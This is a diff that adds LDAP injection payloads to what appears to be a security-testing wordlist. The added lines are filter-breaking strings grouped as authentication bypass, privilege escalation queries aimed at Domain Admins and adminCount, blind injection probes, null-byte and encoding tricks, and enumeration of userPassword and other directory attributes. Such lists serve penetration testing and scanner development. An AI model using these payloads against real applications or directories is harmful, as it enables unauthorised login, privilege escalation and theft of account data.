@@ -37,3 +37,104 @@ mail=*
 # Attribute extraction
 *)(objectClass=*))(%26(objectClass=*
 *)(uid=*))(%26(uid=*
+
+# Extended filter injection
+*)(|(objectClass=*))
+*))%00
+%28%29
+%26
+%7C
+*()|%26'
+*()|&'
+*(|(mail=*))
+*(|(objectclass=*))
+
+# Advanced authentication bypass
+*)(&(objectClass=*))
+*))%00(cn=administrator
+admin*)((|userpassword=*)
+admin*)((|mail=*))
+*)((|(cn=*))
+*)(uid=*))(&(uid=*))
+
+# Privilege escalation attempts
+*)(userAccountControl:1.2.840.113556.1.4.803:=512)
+*)(adminCount=1)
+*)(memberOf=CN=Domain Admins*)
+*)(memberOf=*)
+
+# Time-based blind LDAP injection
+*)(cn=admin))(|(cn=*
+*)(cn=a*)(|(cn=*
+*)(cn=ab*)(|(cn=*
+*)(cn=abc*)(|(cn=*
+
+# Special characters and encoding
+%2a
+%28
+%29
+%26
+%7c
+*%00
+%00*
+*%20
+%20*
+
+# DN injection
+cn=*,ou=*,dc=*
+cn=admin,ou=*,dc=*
+cn=*,ou=users,dc=*
+
+# Multi-attribute injection
+(&(uid=admin)(userPassword=*))
+(&(cn=admin)(mail=*))
+(&(objectClass=person)(uid=*))
+(|(&(uid=admin)(userPassword=*))(uid=backup))
+
+# Error-based injection
+()
+(&)
+(|)
+(!)
+(&(uid=admin)(!(cn=*)))
+
+# Filter chain attacks
+*))(|(objectClass=*
+*))(|(mail=*
+*))(|(userPassword=*
+
+# Attribute enumeration
+(uid=*)
+(cn=*)
+(sn=*)
+(mail=*)
+(telephoneNumber=*)
+(userPassword=*)
+(description=*)
+
+# Nested filter injection
+(&(uid=admin)(&(cn=*)))
+(|(&(uid=admin)(cn=*))(uid=test))
+(&(objectClass=person)(|(uid=admin)(uid=root)))
+
+# Comment injection
+*);#
+*);-- 
+*)//
+
+# Group enumeration
+(memberOf=cn=admins*)
+(memberOf=cn=users*)
+(memberOf=*)
+
+# Substring search
+(cn=adm*)
+(cn=*admin)
+(cn=*admin*)
+(uid=a*)
+(mail=*@admin.com)
+
+# Range queries
+(uidNumber>=1000)
+(uidNumber<=5000)
+(createTimestamp>=20200101000000Z)
